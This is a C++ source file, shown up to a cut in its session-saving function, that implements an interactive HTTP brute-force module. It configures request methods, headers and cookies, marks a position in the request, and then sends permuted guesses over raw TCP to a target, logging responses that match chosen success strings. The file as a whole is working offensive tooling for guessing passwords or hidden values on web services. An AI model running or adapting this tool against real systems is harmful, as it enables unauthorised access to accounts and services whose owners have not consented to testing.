class HttpBrute : Module{
	private:
		Permuter permuter;
		string _padding = "";
		int _maxBruteLength = 5;
		int _startingBruteLength = 1;

		const int WORDLIST_MAX = 5;
		int _wordlistCount = 0;
		string _wordlists[5];

		string _hostName = "localhost";
		string _ipAddress = "127.0.0.1";
		int _portNumber = 80;

		size_t _payloadSize = -1;
		char *_payload = NULL;
		string _method = "GET";
		string _uri = "/";
		string _httpVersion = "HTTP/1.1";
		const int HEADERS_MAX = 10;
		int _extraHeadersCount = 0;
		string _extraHeaders[10];
		int _fetchedHeadersCount = 0;
		string _fetchedHeaders[10][3]; // used to map headers to uri locations, and wether or not to gather every time.
		bool _ignoreCookies = true;
		bool _fetchCookiesOnce = true;
		string _cookieFetchUri = "";
		string _cookies = "";

		const int CONTENT_MAX = 500000;
		size_t _contentLength = -1;
		char _content[500000] = {0};

		const int MAX_NET_BUFFER = 100000;
		char _netBuffer[100000] = {0};
		size_t _netBufferCount = 0;

		int _brutePos[2] = {0, 0};
		int _successStringsMax = 15;
		string _successStrings[15];

		// under construction	
		string _resultsFile = "";
		string _sessionFile = "";
		bool _httpAuth = false;
		const bool _useSsl = false; // unsupported at this time.

		void _showContent(void){
			int a = _contentLength;
			if(_contentLength > CONTENT_MAX)
				a = CONTENT_MAX;
			if(a <= 0){
				memset(_content, 0x00, CONTENT_MAX);
				return;
			}
			for(int i=0; i<a; i++){
				printf("%c", _content[i]);
			}
		}
		void _setContent(void){
			printf("How would you like to set content to send?\n");
			printf("[0] from file\n");
			printf("[1] my keyboard\n");
			printf("(~)> ");
			int option = this->getUserInputInt();
			if(option == 0){
				printf("What's the absolute path to the file?\n(~)> ");
				string inpt = this->getUserInput();
				if(inpt == ""){
					printf("No path given, aborting.\n");
					memset(_content, 0, CONTENT_MAX);
					_contentLength = -1;
					return;
				}
				FileSnake fileSnake;
				memset(_content, 0, CONTENT_MAX);
				if(fileSnake.readFile(inpt, _content, CONTENT_MAX) == false){
					fprintf(stderr, "[E] Failed to read from file.\n");
				}
				_contentLength = fileSnake.recentActivity;
				printf("[+] Content set.\n");
				
			}else if(option == 1){
				printf("What would you like to set the content to?\n(~)> ");
				string inpt = this->getUserInput();
				if(inpt == ""){
					printf("No path given, aborting.\n");
                                        memset(_content, 0, CONTENT_MAX);
                                        _contentLength = -1;
                                        return;
				}
				int a=0;
				if(inpt.length() > CONTENT_MAX)
					a = CONTENT_MAX;
				else
					a = inpt.length();
				for(int i=0; i<a; i++){
					_content[i] = inpt[i];
				}
				_contentLength = a;
			}else{
				fprintf(stderr, "[E] Invalid input option\n");
			}
		}
		void _printPayloadConfig(void){
			printf("\tPayload Size : %ld\n\tHTTP Method : %s\n\tURI : %s\n\tHTTP Version : %s\n\tExtra Header Count : %d\n", 
					(long)_payloadSize, _method.c_str(), _uri.c_str(), _httpVersion.c_str(), _extraHeadersCount);
			printf("\tFetched Header Count : %d\n\tIgnore Cookies : %d\n\tFetch Cookies Once : %d\n\tCookie Fetch location : %s\n", 
					_fetchedHeadersCount, _ignoreCookies, _fetchCookiesOnce, _cookieFetchUri.c_str());
			printf("\tHttp Conetent : ");
			if(_contentLength <= 0 || _contentLength == -1){
				printf("Not available\n");
			}else{
				printf("Being sent\n");
			}
		}
		void _viewExtraHeaders(void){
			for(int i=0; i<HEADERS_MAX; i++){
                                printf("(%d) Header || %s\n", i, _extraHeaders[i].c_str());
                        }
		}
		void _viewFetchedHeaders(void){
			for(int i=0; i<HEADERS_MAX; i++){

                                printf("(%d) Fethched Header : %s || Target URI : %s || When to fetch : %s\n", i, _fetchedHeaders[i][0].c_str(),
                                                                                                                                _fetchedHeaders[i][1].c_str(),
                                                                                                                                _fetchedHeaders[i][2].c_str());
                        }

		}
		void _setFetchedHeaders(void){
                        _viewFetchedHeaders();
                        printf("pick a header to set:\n(~)> ");
                        int option = this->getUserInputInt();
                        if(option >= 0 && option < HEADERS_MAX){
                                printf("set a header name to automatically search for.\n(~)> ");
                                _fetchedHeaders[option][0] = this->getUserInput();
				printf("set a target URI to fetch the header from.\n An empty URI will cause the target URI to be used.\n(~)> ");
				_fetchedHeaders[option][1] = this->getUserInput();
				printf("How would you like this fetched, relative to the attack?\n'pre' will gather the header one time for static ");
				printf("use throughout the duration of the attack. This is the default choice and speeds up the overall time for the attack.\n");
				printf("'during' will gather the header and replace it right before every attack attempt. This slows down the attack.\n(during/Pre)\n(~)> ");
				_fetchedHeaders[option][2] = this->getUserInput();
				if(_fetchedHeaders[option][2] != "during"){
					_fetchedHeaders[option][2] = "pre";
				}

                        }else{
                                fprintf(stderr, "[E] Invalid header id.\n");
                        }

                        _fetchedHeadersCount = 0;
                        for(int i=0; i<HEADERS_MAX; i++)
                                if(_fetchedHeaders[i][0] != "")
                                        _fetchedHeadersCount++;
		}
		void _setExtraHeaders(void){
			for(int i=0; i<HEADERS_MAX; i++){
				printf("(%d) Header || %s\n", i, _extraHeaders[i].c_str()); 
			}
			printf("pick a header to set:\n(~)> ");
			int option = this->getUserInputInt();
			if(option >= 0 && option < HEADERS_MAX){
				printf("set new HTTP header value.\n(~)> ");
				_extraHeaders[option] = this->getUserInput();
			}else{
				fprintf(stderr, "[E] Invalid header id.\n");
			}

			_extraHeadersCount = 0;
			for(int i=0; i<HEADERS_MAX; i++)
				if(_extraHeaders[i] != "")
					_extraHeadersCount++;
		}

		void _printPermuterValues(void){
			printf("\tStarting Length : %d\n", _startingBruteLength);
			printf("\tMax Length : %d\n", _maxBruteLength);
			printf("\tIncrememnt Mapper : ");
			for(int i=0; i<_maxBruteLength; i++)
				printf("%d ", permuter._mapper[i]);
			printf("\n\tFrozen mapper : ");
			for(int i=0; i<_maxBruteLength; i++)
                                printf("%d ", permuter._mapperFrozen[i]);
			printf("\n\tIncrement Order : ");
			for(int i=0; i<_maxBruteLength; i++)
				printf("%d ", permuter._mapperIncOrder[i]);
			printf("\n\tValid Char Mappings :\n");
			for(int i=0; i<_maxBruteLength; i++)
				printf("\t\t%d) %s\n", i, permuter._validCharsArray[i].c_str());
			printf("\n");
		}




		string getSpecialAlphabet(int option){
			switch(option){
				case 0:
					return "abcdefghijklmnopqrstuvwxyz";
				case 1:
					return "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
				case 2:
					return "0123456789";
				case 3:
					return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
				case 4:
					return "abcdefghijklmnopqrstuvwxyz0123456789";
				case 5:
					return "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
				case 6:
					return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
				case 7:
					return "! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 8:
					return "0123456789! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 9:
					return "abcdefghijklmnopqrstuvwxyz! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 10:
					return "ABCDEFGHIJKLMNOPQRSTUVWXYZ! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 11:
					return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 12:
					return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
				case 13:
					return "eariotnslcudpmhgbfywkvxzjq";
				case 14:
					return "EARIOTNSLCUDPMHGBFYWKVXZJQ";
				default:
					fprintf(stderr, "[E] Bad valid char option.\n");
					return "";
			}
		}

		void _setValidCharsCommand(void){
			printf("******************************\n");
			printf("Available Patterns:\n");
			printf("[0] lowercase alphabet (a-z)\n");
			printf("[1] uppercase alphabet (A-Z)\n");
			printf("[2] numeric alphabet (0-9)\n");
			printf("[3] mix-case alphabet (a-zA-Z)\n");
			printf("[4] lowercase-numeric (a-z0-9)\n");
			printf("[5] uppercase-numeric (A-Z0-9)\n");
			printf("[6] mix-case numeric (a-ZA-Z0-9)\n");
			printf("[7] symbolic alphabet (!-+)\n");
			printf("[8] numeric-stymbolic (0-9!-+)\n");
			printf("[9] lowercase-symbolic (a-z!-+)\n");
			printf("[10] uppercase-symbolic (A-Z!-+)\n");
			printf("[11] mix-case-symbolic (a-zA-Z!-+\n");
			printf("[12] mix-numeric-symbolic (a-zA-Z0-9!-+)\n");
			printf("[13] english most frequent (e-q)\n");
			printf("[14] english most frequent capitol (A-Q)\n");
			printf("[100] custom\n");
			printf("[200] from file\n");
			printf("******************************\n");
			printf("\n(~)> ");
			
			string filename = "";
			FileSnake fileSnake;
			char *fBuffer = NULL;
			size_t fileSize = -1;

			int option = this->getUserInputInt();
			int val = 0;
			if(option >= 0 && option <= 14){
				val = option;
				option = 0;
			}
			switch(option){
				case 0:
					permuter._validChars = getSpecialAlphabet(val);
					break;
				case 100:
					printf("Enter a custom string\n(~)> ");
					permuter._validChars = this->getUserInput();
					break;
				case 200:
					printf("Enter a file\n(~)> ");
					filename = this->getUserInput();
					fileSize = fileSnake.getFileSize(filename);
					if(fileSize <= 0){
						fprintf(stderr, "[E] Failed to calculate file size.\n");
						break;
					}

					fBuffer = (char *)malloc(sizeof(char) * fileSize);
                			if(fBuffer == NULL){
                        			break;
                			}

					fileSnake.readFile(filename, fBuffer, fileSize);
					permuter._validChars = "";
					for(int i=0; i<fileSize; i++)
						permuter._validChars += fBuffer[i];

					break;
				default:
					fprintf(stderr, "[E] Bad valid char option.\n");
					return;
			}
			permuter.initValidCharMap();
			printf("[+] Valid chars changed!\n");
		}

		void _setPaddingCommand(void){
			printf("Enter a new padding, the current is '%s'\n(~)> ", _padding.c_str());
                        string padding = this->getUserInput();
                        _padding = padding;
                        printf("[+] Padding changed!\n");
		}

		void _setStartingPatternCommand(void){
			printf("Enter a new starting pattern, the current is '%s'\n(~)> ", permuter._startingPattern.c_str());
                        string startingPattern = this->getUserInput();
                        permuter._startingPattern = startingPattern;
                        printf("[+] Starting Pattern changed!\n");
		}
		void _setMaxBruteLengthCommand(void){
			printf("Enter a new max brute length, the current is '%d'\n(~)> ", _maxBruteLength);
                        _maxBruteLength = this->getUserInputInt();
                        printf("[+] Max brute length changed!\n");
		}

		void _setStartingBruteLengthCommand(void){
			printf("Enter a new starting brute length, the current is '%d'\n(~)> ", _startingBruteLength);
                        _startingBruteLength = this->getUserInputInt();
			permuter._mapperSize = _startingBruteLength;
                        printf("[+] Starting brute length changed!\n");
		}

		void _setResultsFileCommand(void){
                        printf("Enter a new results file, the current is '%s'\n(~)> ", _resultsFile.c_str());
                        string resultsFile = this->getUserInput();
                        _resultsFile = resultsFile;
                        printf("[+] Results file changed!\n");
                }

		void fetchHeaderByNameAndUri(int index){
			if(index > HEADERS_MAX || index < 0){
				fprintf(stderr, "[E] Buffer overflow.\n");
				return;
			}
			string headerName = _fetchedHeaders[index][0];
			string targetUri = _fetchedHeaders[index][1];
			
			NetSnake netsnake;
			
			string request = "";
			request += "GET "+targetUri+" "+_httpVersion+"\r\n";
			request += "Host: "+_hostName+"\r\n";
			request += "\r\n";
		
			memset(_netBuffer, 0x00, MAX_NET_BUFFER);
			if(netsnake.CreateIpClient(_ipAddress, _portNumber, SNAKE_MODE_TCP) == false)
				fprintf(stderr, "[E] failed to connect to %s\n", _ipAddress.c_str());
			netsnake.sendTcpClient(request.c_str(), request.length());
			netsnake.recvTcpClient(_netBuffer, MAX_NET_BUFFER, 0);
			netsnake.closeSocket();
			_netBufferCount = netsnake.recvSize;
			
			string examine = _getNetBufferAsString();
			if(examine.find(headerName) != -1){
				string grabber = "";
				size_t loc = examine.find(headerName);
				for(int i=loc+headerName.length()+strlen(": "); i<examine.length(); i++){
					if(examine[i] == '\r' || examine[i] == '\n'){
						break;
					}
					grabber += examine[i];
				}

				_fetchedHeaders[index][1] = grabber;
				if(_fetchedHeaders[index][2] == "pre")
					_fetchedHeaders[index][2] = "good";
				else
					_fetchedHeaders[index][2] = "during";
			}else{
				fprintf(stderr, "[E] No header found for '%s'\n", headerName.c_str());
			}
		}

		string _getNetBufferAsString(void){
			if(_netBufferCount <= 0 || _netBufferCount > MAX_NET_BUFFER)
				return "";
			string ret = "";
			for(int i=0; i<_netBufferCount; i++){
				ret += _netBuffer[i];
			}
			return ret;
		}

		string generatePayload(string warHead){
			string ret = "";
			int warHeadLoc = _brutePos[0] + _brutePos[1];

			ret += _method + " " + _uri + " " + _httpVersion + "\r\n";
			ret += "Host: " + _hostName + "\r\n";
			for(int i=0; i<HEADERS_MAX; i++){
				if(_extraHeaders[i] != ""){
					ret += _extraHeaders[i] + "\r\n";
				}
			}
			if(!_ignoreCookies){
				string test = _netBuffer;
				if(_cookies != "" && _fetchCookiesOnce){
					ret += "Cookie: "+_cookies+"\r\n";
				}else if(_cookies == "" && _fetchCookiesOnce){
					string h = _uri;
					if(_cookieFetchUri != "")
						h = _cookieFetchUri;

					_cookies = _fetchCookieByUri(h);
					if(_cookies != "")
						ret += "Cookie: " + _cookies + "\r\n";
				}else if(!_fetchCookiesOnce && _cookieFetchUri != ""){
					_cookies = _fetchCookieByUri(_cookieFetchUri);
					if(_cookies != "")
						ret += "Cookie: " + _cookies + "\r\n";
				}else{
					_cookies = _fetchCookieByUri(_uri);
					if(_cookies != "")
						ret += "Cookie: "+_cookies + "\r\n";
				}
			}
			if(_fetchedHeadersCount > 0){
				for(int i=0; i<HEADERS_MAX; i++){
					if(_fetchedHeaders[i][0] != "" && _fetchedHeaders[i][2] == "good"){
						ret += _fetchedHeaders[i][0] + ": "+_fetchedHeaders[i][1] + "\r\n";
						continue;
					}
					if(_fetchedHeaders[i][0] != ""){
						fetchHeaderByNameAndUri(i);
						ret += _fetchedHeaders[i][0] + ": "+_fetchedHeaders[i][1] + "\r\n";	
					}
				}
			}
			if(ret.length() >= warHeadLoc && warHead != ""){
				if(warHeadLoc <= 0){
					ret = warHead + ret;
				}else if(warHeadLoc >= ret.length()){
					ret  += warHead;
				}else{
					string grab = "";
					for(int i=0; i<warHeadLoc; i++){
						grab += ret[i];
					}

					grab += warHead;

					for(int i=warHeadLoc; i<ret.length(); i++){
						grab += ret[i];
					}
					ret = grab;
				}
			}
			ret += "\r\n";
			return ret;	
		}

		void _setSuccessStrings(void){
			for(int i=0; i<_successStringsMax; i++){
				printf("(%d) Success Strings || %s\n", i, _successStrings[i].c_str()); 
			}
			printf("pick a success string to set:\n(~)> ");
			int option = this->getUserInputInt();
			if(option >= 0 && option < _successStringsMax){
				printf("set new success string value.\n(~)> ");
				_successStrings[option] = this->getUserInput();
			}else{
				fprintf(stderr, "[E] Invalid success string id.\n");
			}
		}

		void _configurePayloadCommand(void){
			_printPayloadConfig();
			if(_payloadSize <= -1)
				printf("The payload size will update upon successful generation.\n");
		
			bool configuring = true;
			while(configuring){
				printf("Payload Configuration:\n");
				printf("[0] set http method\n");
				printf("[1] set uri\n");
				printf("[2] set http version\n");
				printf("[3] set custom headers\n");
				printf("[4] set fetched headers\n");
				printf("[5] set cookie handling\n");
				printf("[6] view payload config\n");
				printf("[7] set content\n");
				printf("[8] show content\n");
				printf("[9] view sample payload\n");
				printf("[10] set brute location\n");
				printf("[11] set validation strings\n");
				printf("[99] exit this menu\n");
				printf("(~)> ");
				int option = this->getUserInputInt();
				string trash = "";
				string plod = "";
				string map = "";
				int lineCount = 0;
				int inc = 0;
				switch(option){
					case 0:
						printf("******************************\n");
						printf("Provide a new HTTP Method value, the current is '%s'\n(~)> ", _method.c_str());
						_method = this->getUserInput();
						_printPayloadConfig();
						printf("\npress enter to continue...");
						printf("******************************\n");
						trash = this->getUserInput();
						break;
					case 1:
						printf("******************************\n");
						setUri();
						printf("******************************\n");
						break;
					case 2:
						printf("******************************\n");
						printf("Provide a new Http Version, the current is '%s'\n(~)> ", _httpVersion.c_str());
                                                _httpVersion = this->getUserInput();
                                                _printPayloadConfig();
                                                printf("\npress enter to continue...");
						printf("******************************\n");
                                                trash = this->getUserInput();
						break;
					case 3:
						printf("******************************\n");
						_setExtraHeaders();
						_viewExtraHeaders();
						printf("******************************\n");
						break;
					case 4:
						printf("******************************\n");
						_setFetchedHeaders();
						_viewFetchedHeaders();
						printf("******************************\n");
						break;
					case 5:
						printf("******************************\n");
						printf("Would you like to ignore cookies? (no/Yes)\n(~)> ");
						trash = this->getUserInput();
					       	if(trash == "yes" || trash == "yes" || trash == "y" || trash == "Y"){
							_ignoreCookies = true;
							break;
						}
						_ignoreCookies = false;
						
						printf("Would you like to fetch cookies once before the attack, or fetch it from every attack attempt? (many/Once)\n(~)> ");
						trash = this->getUserInput();
						if(trash == "o" || trash == "O" || trash == "once" || trash == "Once"){
							_fetchCookiesOnce = true;
						}else{
							_fetchCookiesOnce = false;
						}
						
						printf("Is the cookie gathered from the same URI that you're attacking? (no/Yes)\n(~)> ");
						trash = this->getUserInput();
						if(trash == "yes" || trash == "yes" || trash == "y" || trash == "Y"){
                                                  	_cookieFetchUri = "";
							printf("******************************\n");
                                                        break;
                                                }
						printf("What's the URI for fetching the cookie?\n(~)> ");
						_cookieFetchUri = this->getUserInput();
						printf("******************************\n");
						break;
					case 6:
						printf("******************************\n");
						_printPayloadConfig();
						printf("******************************\n");
						break;
					case 7:
						printf("******************************\n");
						_setContent();
						printf("******************************\n");
						break;
					case 8:
						printf("******************************\n");
						printf("Content-Length : %ld\nContent being sent : ", (long)_contentLength);
						_showContent();
						printf("\n");
						printf("******************************\n");
						break;
					case 9:
						printf("Sample Payload using current configuration.\n");
						plod = generatePayload("\033[41mPAYLOAD\033[0m");
						printf("%s\n", plod.c_str());
						break;
					case 10:
						printf("Updating brute force cooredinates...\n");
						map = generatePayload("\033[41m \033[0m");

						lineCount = 0;
						printf("%d) ", lineCount);
						for(int i=0; i<map.length(); i++){
							if(map[i] == '\r')
								if(i+1 < map.length() && map[i+1] == '\n'){
									lineCount++;
									i++;
									printf("\n%d) ", lineCount);
									continue;
								}
							if(map[i] == '\n'){
								lineCount++;
								printf("\n%d) ", lineCount);
								continue;
							}
							printf("%c", map[i]);
						}

						printf("Select a line number to set the position to.\n(~)> ");
						_brutePos[1] = this->getUserInputInt();
						if(_brutePos[1] <= -1 || _brutePos[1] >= lineCount){
							fprintf(stderr, "[E] invalid line number, aboriting...\n");
							break;
						}
						trash = "";
						inc = 0;
						lineCount = 0;
						map = generatePayload("");
						for(int i=0; i<map.length(); i++){
							if(lineCount >= _brutePos[1]){
								if(lineCount == _brutePos[1]){
									inc = i;
									lineCount++;
								}
								if(map[i] == '\r' || map[i] == '\n')
									break;
								trash += map[i];
							}else{
								if(map[i] == '\r')
									if(i+1 < map.length() && map[i+1] == '\n'){
										lineCount++;
										i++;
										continue;
									}
								if(map[i] == '\n'){
									lineCount++;
									continue;
								}
							}
						}
						_brutePos[1] = inc;
						for(int i=0; i<trash.length(); i++){
							if(i == _brutePos[0])
								printf("\033[41m");
							
							printf("%d) %c", i, trash[i]);

							if(i == _brutePos[0])
								printf("\033[0m");

							printf("\n");
						}
						printf("\nWhich position would you like to set the brute string?\n(~)> ");
						_brutePos[0] = this->getUserInputInt();

						break;
					case 11:
						_setSuccessStrings();	
						break;
					case 99:
						printf("Exiting payload config menu.\n");
						configuring = false;
						break;
					deafault:
						printf("Invalid config option.\n");
						break;
				}
			}
		}

		void _modifyPermuteIncrementOrder(void){
			printf("+++++++++++++++++++++++++++++++++\n");
			for(int i=0; i<_maxBruteLength; i++){
				printf("(%d) Order Value : %d\n", i, permuter._mapperIncOrder[i]);
			}
			printf("\n\nEnter the first order id you want swapped.\n(~)> ");
			int a = this->getUserInputInt();
			printf("\n\nEnter the second order id you want swapped.\n(~)> ");
			int b = this->getUserInputInt();

			permuter.swapIncrementOrders(a, b);
			for(int i=0; i<_maxBruteLength; i++){
                                printf("(%d) Order Value : %d\n", i, permuter._mapperIncOrder[i]);
                        }
			printf("+++++++++++++++++++++++++++++++++\n");
		}

		void _showRoundValidChars(void){
			for(int i=0; i<_maxBruteLength; i++){
                                printf("(%d) Round Valid Chars : %s\n", i, permuter._validCharsArray[i].c_str());
                        }
		}
		void _modifyRoundValidChars(void){
			printf("+++++++++++++++++++++++++++++++++\n");
			_showRoundValidChars();
			printf("\n\nWhich pattern would you like to change?\n(~)> ");
			int round = this->getUserInputInt();
			if(round <= -1 || round >= permuter._mapperSize){
				fprintf(stderr, "[E] Bad input.\n");
				return;
			}
			printf("******************************\n");
                        printf("Available Patterns:\n");
                        printf("[0] lowercase alphabet (a-z)\n");
                        printf("[1] uppercase alphabet (A-Z)\n");
                        printf("[2] numeric alphabet (0-9)\n");
                        printf("[3] mix-case alphabet (a-zA-Z)\n");
                        printf("[4] lowercase-numeric (a-z0-9)\n");
                        printf("[5] uppercase-numeric (A-Z0-9)\n");
                        printf("[6] mix-case numeric (a-ZA-Z0-9)\n");
                        printf("[7] symbolic alphabet (!-+)\n");
                        printf("[8] numeric-stymbolic (0-9!-+)\n");
                        printf("[9] lowercase-symbolic (a-z!-+)\n");
                        printf("[10] uppercase-symbolic (A-Z!-+)\n");
                        printf("[11] mix-case-symbolic (a-zA-Z!-+\n");
                        printf("[12] mix-numeric-symbolic (a-zA-Z0-9!-+)\n");
                        printf("[13] english most frequent (e-q)\n");
                        printf("[14] english most frequent capitol (A-Q)\n");
                        printf("[100] custom\n");
                        printf("[200] from file\n");
                        printf("******************************\n");
                        printf("\n(~)> ");


			string filename = "";
			FileSnake fileSnake;
			char *fBuffer = NULL;
			size_t fileSize = -1;

			int option = this->getUserInputInt();
			int val = 0;
			if(option >= 0 && option <= 14){
				val = option;
				option = 0;
			}
			switch(option){
				case 0:
					permuter._validCharsArray[round] = getSpecialAlphabet(val);
					break;
				case 100:
					printf("Enter a custom string\n(~)> ");
					permuter._validCharsArray[round] = this->getUserInput();
					break;
				case 200:
					printf("Enter a file\n(~)> ");
					filename = this->getUserInput();
					fileSize = fileSnake.getFileSize(filename);
					if(fileSize <= 0){
						fprintf(stderr, "[E] Failed to calculate file size.\n");
						break;
					}

					fBuffer = (char *)malloc(sizeof(char) * fileSize);
                			if(fBuffer == NULL){
                        			break;
                			}

					fileSnake.readFile(filename, fBuffer, fileSize);
					permuter._validCharsArray[round] = "";
					for(int i=0; i<fileSize; i++)
						permuter._validCharsArray[round] += fBuffer[i];

					break;
				default:
					fprintf(stderr, "[E] Bad valid char option.\n");
					return;
			}

			_showRoundValidChars();
			printf("+++++++++++++++++++++++++++++++++\n");
		}

		void _printPermuterFrozenMapper(void){
			for(int i=0; i<_maxBruteLength; i++){
                                printf("(%d) Is Round Frozen? || %d\n", i, permuter._mapperFrozen[i]);
                        }
		}
		void _setFrozenRounds(void){
			printf("+++++++++++++++++++++++++++++++++\n");
			if(permuter._mapperFrozen == NULL || permuter._mapperSize <= 0)
				return;
			
			_printPermuterFrozenMapper();

			printf("\n\nWhich round would you like to toggle?\n(~)> ");
			int option = this->getUserInputInt();
			if(option <= -1 || option >= permuter._mapperSize)
				return;
			if(permuter._mapperFrozen[option] == true)
				permuter._mapperFrozen[option] = false;
			else if(permuter._mapperFrozen[option] == false)
				permuter._mapperFrozen[option] = true;

			_printPermuterFrozenMapper();
			printf("[+] Toggled mapper value.\n");
			printf("+++++++++++++++++++++++++++++++++\n");
		}


		void _configurePermuter(void){
			bool go = true;
			while(go){
				printf("+++++++++++++++++++++++++++++++++\n");
				printf("[0] set valid chars\n");
				printf("[1] set starting value length\n");
				printf("[2] set max value length\n");
				printf("[3] modify increment order\n");
				printf("[4] modify round valid chars.\n");
				printf("[5] show round valid chars.\n");
				printf("[6] set frozen rounds\n");
				printf("[7] view frozen rounds\n");
				printf("[99] exit menu\n");
				printf("+++++++++++++++++++++++++++++++++\n");
				printf("\n(~)> ");
				int option = this->getUserInputInt();
				switch(option){
					case 0:
						printf("Current valid char string : %s\n", permuter._validChars.c_str());
						_setValidCharsCommand();
						printf("New valid char string : %s\n", permuter._validChars.c_str());
						break;
					case 1:
						_setStartingBruteLengthCommand();
						break;
					case 2:
						_setMaxBruteLengthCommand();
						break;
					case 3:
						_modifyPermuteIncrementOrder();
						break;
					case 4:
						_modifyRoundValidChars();
						break;
					case 5:
						_showRoundValidChars();
						break;
					case 6:
						_setFrozenRounds();
						break;
					case 7:
						_printPermuterFrozenMapper();
						break;
					case 99:
						go = false;
						break;
					default:
						printf("bad command\n");
						break;
				}
			}
		}

		string _fetchCookieFromNetBuffer(void){
			string resultPacket = _netBuffer;
                        if(resultPacket.find("set-cookie:") == -1 && resultPacket.find("Set-Cookie:") == -1){
                                fprintf(stderr, "[E] Failed to find cookies.\n");
                                return "";
                        }

			string ret = "";
                        bool executing = true;
                        while(executing){
                                if(resultPacket.find("set-cookie:") == -1 && resultPacket.find("Set-Cookie:") == -1){
                                        executing = false;
                                        break;
                                }
                                string grabber = "";
                                size_t setCookiePos = resultPacket.find("set-cookie:");
                                if(setCookiePos == -1 || setCookiePos <=0)
                                        setCookiePos = resultPacket.find("Set-Cookie:");
                                if(setCookiePos == -1 || setCookiePos <=0){
                                        fprintf(stderr, "[E] Failed to get cookie position.");
                                        executing = false;
                                        break;
                                }

                                int endingI = 0;
                                int startingI = setCookiePos+strlen("set-cookie:");
                                for(int i=startingI; i<resultPacket.length(); i++){
                                        if(resultPacket[i] == ';' || resultPacket[i] == '\r' || resultPacket[i] == '\n'){
                                                endingI = i;
                                                break;
                                        }
                                        grabber += resultPacket[i];
				}
                                ret += grabber + ";";
                                grabber = "";
                                for(int i = endingI; i<resultPacket.length(); i++){
                                        grabber += resultPacket[i];
                                }
                                resultPacket = grabber;

                        }
                        return ret;
		}

		string _fetchCookieByUri(string targetUri){
			string ret = "";
			NetSnake netSnake;

			string fetchPacket = "";
			fetchPacket += "GET "+targetUri+" "+_httpVersion+"\r\n";
			fetchPacket += "Host: "+_hostName+"\r\n";
       	 		//fetchPacket += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
        		//fetchPacket += "Accept-Language: en-US,en;q=0.5\r\n";
        		//fetchPacket += "Accept-Encoding: gzip, deflate\r\n";


			fetchPacket += "\r\n";

			memset(_netBuffer, 0x00, MAX_NET_BUFFER);
			netSnake.CreateIpClient(_ipAddress, _portNumber, SNAKE_MODE_TCP);
			netSnake.sendTcpClient(fetchPacket.c_str(), fetchPacket.length());
			netSnake.recvTcpClient(_netBuffer, MAX_NET_BUFFER, 0);
			netSnake.closeSocket();

			return _fetchCookieFromNetBuffer();
			
		}
		void _attackBruteForceCommand(void){
			showConfigs();
			
			string resp;
			printf("Would you like to clear the last run's result file? (y/N)\n(~)> ");
			resp = this->getUserInput();
			if(resp == "y" || resp == "Y" || resp == "yes" || resp == "Yes"){
				FileSnake fs;
				fs.removeFile(_resultsFile);
			}

			printf("Does Everything look good to you? (y/N)\n(?)> ");
			resp = this->getUserInput();
			if(resp != "y" && resp != "Y" && resp != "yes" && resp != "Yes"){
				printf("aborting the attack.\n");
				return;
			}

			/*
			 * Attack prep.
			 * */
			_cookies = "";
			if(!_ignoreCookies){
                        	string h = _uri;
                                if(_cookieFetchUri != "")
                                	h = _cookieFetchUri;
				_cookies = _fetchCookieByUri(h);
                        }

			/*
			 * Begining attack
			 * */
			printf("Attack Launching!\n");
			for(int i=_startingBruteLength-1; i<_maxBruteLength; i++){
				permuter._mapperSize = i;
				permuter.resetMapper();
				printf("\t\tAdjusting payload length to %d\n", i);
				while(permuter._maxIncrement == false){
					string warHead = "";
					for(int j=0; j<permuter._mapperSize; j++){
						warHead += permuter.getValueByI(j);
					}
					/* send packet */
					NetSnake netSnake;
					memset(_netBuffer, 0x00, MAX_NET_BUFFER);
					_netBufferCount = 0;
						
					string explosive = generatePayload(warHead);
					netSnake.CreateIpClient(_ipAddress, _portNumber, SNAKE_MODE_TCP);
					netSnake.sendTcpClient(explosive.c_str(), explosive.length());
					netSnake.recvTcpClient(_netBuffer, MAX_NET_BUFFER, 0);
					netSnake.closeSocket();
					_netBufferCount = netSnake.recvSize;

					/* check validation values */
					string test = _getNetBufferAsString();
					bool found = false;
					string successOn = "";
					for(int j=0; j<_successStringsMax; j++){
						if(_successStrings[j] != "" && test.find(_successStrings[j]) != -1){
							found = true;
							successOn = _successStrings[j];
						}
					}
					
					if(found){
						printf("\332\r [+] %s ~> %s          \n", warHead.c_str(), successOn.c_str());
						fflush(stdout);
						string io = "";
						io += "[+] Found : '" + warHead + "' | "+successOn+"\n";
						FileSnake snake;
						snake.writeFileAppend(_resultsFile, (char *)io.c_str(), io.length());
					}else{
						printf("\332\r %s       \r", warHead.c_str());
						fflush(stdout);
					}
					/* handle success / failures */
					permuter.Increment();
				}
			}
			printf("Attack Completed.\n");
		}

		void _setSessionFile(void){
			printf("Please set a new session file location, the current is : '%s'\n(~)> ", _sessionFile.c_str());
			_sessionFile = this->getUserInput();
		}

		void _deleteSessionFile(void){
			if(_sessionFile == ""){
				printf("No session file set.\n");
				return;
			}
			if(unlink(_sessionFile.c_str()) != 0){
				fprintf(stderr, "[E] Failed to delete session file.\n");
			}else{
				printf("Successfully removed session file\n");
			}
		}

		void _saveSession(void){
			base64Class base64;
			string fileData = "";
			string tmp = "";
			char tmp2[20] = {0};
			memset(tmp2, 0, 20);
			
			// 0
			sprintf(tmp2, "%d", _maxBruteLength);
			tmp = tmp2;
			fileData += "_maxBruteLength: "+tmp+"\r\n";

			// 1
			memset(tmp2, 0, 20);
			sprintf(tmp2, "%d", _startingBruteLength);
			tmp = tmp2;
			fileData += "_startingBruteLength: "+tmp+"\r\n";

			//const int WORDLIST_MAX = 5;
			//_wordlistCount
			//_wordlists[5]

			// 2
